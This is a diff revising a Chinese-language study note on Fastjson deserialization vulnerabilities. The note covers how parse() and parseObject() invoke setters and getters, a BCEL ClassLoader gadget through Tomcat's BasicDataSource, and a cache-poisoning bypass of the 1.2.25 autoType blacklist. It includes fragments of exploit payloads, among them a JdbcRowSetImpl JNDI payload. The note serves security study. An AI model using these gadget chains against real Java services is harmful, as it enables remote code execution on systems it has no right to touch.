@@ -1,3 +1,15 @@
+---
+title: Fastjson 反序列化
+categories:
+- Network_Security
+- Web
+- Java_Security
+- Fastjson
+tags:
+- Java
+- Serialization
+---
+
 # Fastjson 的反序列化漏洞
 
 ## 1. 漏洞探测
@@ -41,18 +53,21 @@
 1. 参考：
 
     > https://www.cnblogs.com/Aurora-M/p/15683941.html
+
 2. JSON 的序列化分为两种：`JSON.parse()` 和 `JSON.parseObject()`。
-3. **两者的区别在于，`parseObject()` 本质上同样是调用 `parse()` 进行反序列化的，只是在最后多了一步 `JSON.toJSON()` 操作。**
-4. `parseObject()` 在解析成 JavaBean 时，其中的 `JSON.toJSON()` **会通过调用这个 JavaBean 的所有 setter、getter 方法来实例化**一个 JavaBean。
-5. `parse()` 调用的 setter 和 getter 是有条件的：
-6. 对于 setter，其需要满足：
+
+3. 两者的区别在于，`parseObject()` 本质上同样是调用 `parse()` 进行反序列化的，**只是在最后多了一步 `JSON.toJSON()` 操作。**
+    因此 `parseObject()` 在解析成 JavaBean 时，其中的 `JSON.toJSON()` **会通过调用目标 JavaBean 的所有 setter、getter 方法来实例化**一个 JavaBean。
+    **但是 `parse()` 调用的 setter 和 getter 是有条件的**：对于 setter，其需要满足：
     方法名长于 4，以 set 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。正常的 setter 就满足上述条件，当然，正常的 setter 内部还要给属性赋值，这里就不需要。
     具体的源码详见：`JavaBeanInfo`：
     ![image-20230420144533441](Serialization-fastjson/image-20230420144533441.png)
-7. 对于 getter，其满足的条件较为苛刻：
+    但是对于 getter，其满足的条件较为苛刻：
     方法名长于 4、不是静态方法、以 get 开头且第4位是大写字母、方法不能有参数传入、**返回值继承自 `Collection`|`Map`|`AtomicBoolean`|`AtomicInteger`|`AtomicLong`**、**对应属性没有 setter 方法**：
     ![image-20230420144654650](Serialization-fastjson/image-20230420144654650.png)
-8. 因此总的来看，`parseObject()` 的危害要更大一点。
+
+4. su18 师傅的结论是 `parse()` 会解析字符串获取 `@type` 指定的类，而 `JSON.parseObject(jsonString, Target.class)` 则会直接使用参数中的 class。
+    因此总的来看，`parseObject()` 的利用面要更大一点。
 
 ### 2.4 原理示例
 
@@ -183,32 +198,28 @@
     }
     ```
 
-4. 首先是为什么在 `loadClass()` 前需要加 `$$BCEL$$`，因为只有这样才能进 `if`：
+    首先是为什么在 `loadClass()` 前需要加 `$$BCEL$$`，因为只有这样才能进 `if`：
     ![image-20230515153416767](Serialization-fastjson/image-20230515153416767.png)
     其中 `class_name` 就是传入的第一个参数的值。
-
-5. 进了 `if` 之后，就会调用关键方法：`createClass(class_name)`，跟进，可以看它的执行逻辑：
+    进了 `if` 之后，就会调用关键方法：`createClass(class_name)`，跟进，可以看它的执行逻辑：
     ![image-20230515153626871](Serialization-fastjson/image-20230515153626871.png)
     在 `$$BCEL$$` 之后的字节码，会被 `Utility.decode()`，因此要使用 `Utility.encode()`，然后调用 `parse()`：
     ![image-20230515153742231](Serialization-fastjson/image-20230515153742231.png)
     可以看出其作用就是将 class 文件转成 `JavaClass` 。
+    回到 `ClassLoader#loadClass()`，结果就是返回类的 class 对象。然后调用 `newInstance()` 实例化。
 
-6. 回到 `ClassLoader#loadClass()`，结果就是返回类的 class 对象。然后调用 `newInstance()` 实例化。
-
-7. 知道了 `ClassLoader` 的基本使用方法后，接下来的问题在于如何调用到 `classLoader.loadClass`。Tomcat 中有个类为 `org.apache.tomcat.dbcp.dbcp2.BasicDataSource`。
+4. 知道了 `ClassLoader` 的基本使用方法后，接下来的问题在于如何调用到 `classLoader.loadClass`。Tomcat 中有个类为 `org.apache.tomcat.dbcp.dbcp2.BasicDataSource`。
 
     1. 首先这个类可以指定 ClassLoader，而且也可以实例化。
     2. 同时这个指定和触发都有**对应的 setter 方法**。
 
-8. 在 `BasicDataSource#createConnectionFactory()` 中，指定了类加载器和类：
+    在 `BasicDataSource#createConnectionFactory()` 中，使用了类加载器和类：
     ![在这里插入图片描述](Serialization-fastjson/bae44c93c8644ff3934450075c37b1a7.png)
     高版本中（dbcp 8.5.78)，这里的运行逻辑发生了改变，但是最终执行的结果不变。
+    指定 ClassLoader 在 `BasicDataSource#setDriverClassName()` 和 `BasicDataSource#setDriverClassLoader()` 的两个 set 方法中。
+    最终触发对象实例化的点在 `BasicDataSource#getConnection()`，一路执行，最终到上面的两个 set 方法。
 
-9. 指定 ClassLoader 在 `BasicDataSource#setDriverClassName()` 和 `BasicDataSource#setDriverClassLoader()` 的两个 set 方法中。
-
-10. 最终触发对象实例化的点在 `BasicDataSource#getConnection()`，一路执行，最终到上面的两个 set 方法。
-
-11. 得到的最终 payload 如下：
+5. 得到的最终 payload 如下：
     ```java
     private static void ClassLoaderGadget() throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {
         // com.sun.org.apache.bcel.internal.util.ClassLoader 的基本的使用方法
@@ -245,22 +256,24 @@
     ![checkAutoType-1.2.25](Serialization-fastjson/checkAutoType-1.2.25-1684222024311-2.png)
 
     一般情况下，`autoTypeSupport = false`，然后 `expectClass` 为 null。
+    根据上述变量条件，首先黑白名单基本不考虑，再根据逻辑判断，最终选择走 `clazz == null` 的分支，也就是走 `expectClass != null && !expectClass.isAssignableFrom(clazz)`，显然 `expectClass==null`，所以必定会返回 `clazz`。但走这就要求 `clazz` 要不为空，而 `clazz` 是从缓存中获取的。
+    ![image-20241025105836157](Serialization-fastjson/image-20241025105836157.png)
+    那么接下来就是想办法“如何往缓存中插入恶意类，从而绕过黑白名单检测”
 
-3. 根据上述变量条件，首先黑白名单基本不考虑，再根据逻辑判断，最终选择走 `clazz == null` 的分支。走这就要求 `clazz` 要不为空，而 `clazz` 是从缓存中获取的，那么接下来就是想办法“如何往缓存中插入恶意类，从而绕过黑白名单检测”。
-
-4. 寻找 usage，找到 `put` 的地方，最终确定在 `TypeUtils#loadClass()` 中。然后再找这个方法的 usage。最终在 `MiscCodec#deserialze()` 中：
+3. 跟进上述方法，
+    ![image-20241025105911472](Serialization-fastjson/image-20241025105911472.png)
+    寻找 `mappings` 的 usage，找到 `put` 的地方，最终确定在 `TypeUtils#loadClass()` 中。
+    ![image-20241025110137880](Serialization-fastjson/image-20241025110137880.png)
+    然后再找这个方法的 usage。最终在 `MiscCodec#deserialze()` 中：
     ![image-20230516154052292](Serialization-fastjson/image-20230516154052292.png)
-
-5. 观察一下，`MiscCodeC` 继承了 `ObjectSerializer, ObjectDeserializer` ，所以它应该是序列化反序列化器，然后在 `ParserConfig` 类中，`deserializers` 中存放了不同的类所对应的序列化器：![image-20230516154811064](Serialization-fastjson/image-20230516154811064.png)
+    观察一下，`MiscCodeC` 继承了 `ObjectSerializer, ObjectDeserializer` ，所以它应该是序列化与反序列化器，然后在 `ParserConfig` 类中，`deserializers` 中存放了不同的类所对应的序列化器：![image-20230516154811064](Serialization-fastjson/image-20230516154811064.png)
     然后 `MiscCodec#deserialze()` 正是它反序列化时调用的方法，其中的 clazz 就是被序列化类的 class 字节码类型。
-
-6. 因此，**如果传入一个 `Class` 类给反序列化**，那么 Fastjson 就会调用 `MiscCodec#deserialze()` 进行处理，然后就会进入到 `loadClass()` 中，从而会将传入的 `strVal` 所代表的类放入缓存中。
-
-7. 如果 `strVal` 指代的是恶意类，那么就把恶意类放入到缓存中，这样就会绕过黑白名单检测。所以要向 `strVal` 中赋值。
+    因此，**如果传入一个 `Class` 类给反序列化**，那么 Fastjson 就会调用 `MiscCodec#deserialze()` 进行处理，然后就会进入到 `loadClass()` 中，从而会将传入的 `strVal` 所代表的类放入缓存中。
+    如果 `strVal` 指代的是恶意类，那么就把恶意类放入到缓存中，这样就会绕过黑白名单检测。所以要向 `strVal` 中赋值。
     ![image-20230516161115939](Serialization-fastjson/image-20230516161115939.png)
     todo 我也不懂为什么要往 `val` 中赋值，但 `val` 赋值后确实会到 `strVal` 中。
 
-8. 最终 payload 如下：
+4. 最终 payload 如下：
     ```java
     private static void Bypass1_2_25_JNDI() {
         String payload = "{{\"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
